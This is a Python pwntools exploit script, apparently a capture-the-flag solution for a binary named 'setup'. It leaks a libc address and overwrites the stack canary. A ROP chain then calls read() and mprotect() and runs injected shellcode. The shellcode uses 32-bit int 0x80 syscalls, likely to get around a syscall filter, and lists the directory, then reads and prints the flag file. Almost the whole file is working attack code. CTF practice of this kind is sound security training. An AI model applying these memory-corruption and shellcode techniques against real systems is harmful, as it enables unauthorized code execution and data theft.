#!/usr/bin/python3

from pwn import *
import subprocess

# def GDB():
#     proc = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
#     ps = proc.stdout.read().split(b'\n')
#     pid = ''
#     for i in ps:
#         # Change the recognization here
#         if b'./setup' in i:
#             pid = i.split(b'    ')[1].decode().split('  ')[0]
#             # print(pid)

#     # Change command here
#     command = '''
#     b*install+815
#     b*install+685
#     '''
#     with open('/tmp/command.gdb', 'wt') as f:
#         f.write(command)

#     # Need sudo permission
#     subprocess.Popen(['sudo', '/usr/bin/x-terminal-emulator', '--geometry', '960x1080+0+0', '-e', 'gdb', '-p', pid, '-x', '/tmp/command.gdb'])
#     # subprocess.Popen(['sudo', '/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', pid, '-x', '/tmp/command.gdb'])
#     input()     # input() to make program wait with gdb

def GDB():
    command = '''
    b*install+833
    c
    ni
    ni
    ni
    ni
    ni
    '''
    with open('/tmp/command.gdb', 'wt') as f:
        f.write(command)
    # subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+0+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    input()         # input() to make program wait with gdb

libc = ELF('./libc-2.34.so', checksec=False)
context.binary = exe = ELF('./setup', checksec=False)
context.log_level = 'debug'

if args.LOCAL:
    p = process(exe.path)
else: 
    p = remote('127.0.0.1', 9991)

# Break at sleep will cause bad syscall

##########################################
### Stage 1: Overwrite original canary ###
##########################################
# To find the address of original canary, 
# debug with gdb then use 'search' to search
# for all addresses to know which address contain
# original libc (that's the address before libc)
p.sendlineafter(b'> ', b'1')
if args.LOCAL:
    GDB()
p.sendafter(b'to: ', b'A'*(0x18) )
p.sendlineafter(b'> ', b'1')

p.recvuntil(b'A'*(0x18))
libc_leak = u64(p.recvline()[:6] + b'\x00'*2)
libc.address = libc_leak - 0xed88e
original_canary_addr = libc.address - 0x2898
log.info(hex(libc_leak))
log.info(hex(libc.address))
log.info(hex(original_canary_addr))

####################
### Stage 2: RCE ###
####################
pop_rax = 0x0000000000049f10 + libc.address
pop_rdx = 0x0000000000120272 + libc.address
pop_rdi = 0x000000000002e6c5 + libc.address
pop_rsi = 0x0000000000030081 + libc.address
syscall = 0x0000000000095196 + libc.address

# We have 3 address so do a read() is possible with
# rax = 0
# rdx = 0xffffffff
# rsi = rsp - ???
payload = flat(
    original_canary_addr,
    b'B'*0x58,
    pop_rdi, 0,
    syscall
)
p.sendafter(b'name: ', payload)

# We have unlimited input now.
# But I prefer shellcode so let's mprotect() and input
# shellcode, then execute our shellcode
payload = b'D'*0x21d0
payload += flat(
    # mprotect
    pop_rax, p64(0xa),
    pop_rdi, libc.address + 0x21a000,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    syscall,

    # Input shellcode
    pop_rdi, 0,
    pop_rsi, libc.address + 0x21a800,
    pop_rdx, 0x1000,
    syscall,

    # Execute shellcode
    libc.address + 0x21a800,
    )
p.sendafter(b'Data: ', b'B'*8 + payload)

# C function order:
# 1. mmap2(0x500000, 0x5000, 3, 1048610, 0, 0)
#
# 2. fd1 = open(".", 0, 0)
# 3. getents(fd1, $rsp, 0x1337)
#
# 4. fd2 = open(flag, 0, 0)
# 5. read(fd2, $rsp, 0x100)
# 6. write(1, $rsp, 0x100)
shellcode = asm(
    '''
    mov rax, 0xc0
    mov rbx, 0x500000
    mov rcx, 0x5000
    mov rdx, 3
    mov rsi, 1048610
    xor rdi, rdi
    xor rbp, rbp
    int 0x80

    mov rsp, 0x500a00

    mov rax, 5
    push 0x2e
    mov rbx, rsp
    xor rcx, rcx
    int 0x80

    mov rbx, rax
    mov rax, 0x8d
    mov rcx, rsp
    mov rdx, 0x1337
    int 0x80

    add rcx, 162

    mov rax, 5
    mov rbx, rcx
    xor rcx, rcx
    xor rdx, rdx
    int 0x80

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall
    ''', arch='amd64')
# input("Press ENTER...")
p.sendafter(b'Hello World Setup Wizard\n\x1b[0m', shellcode)

print(p.recvall())
p.interactive()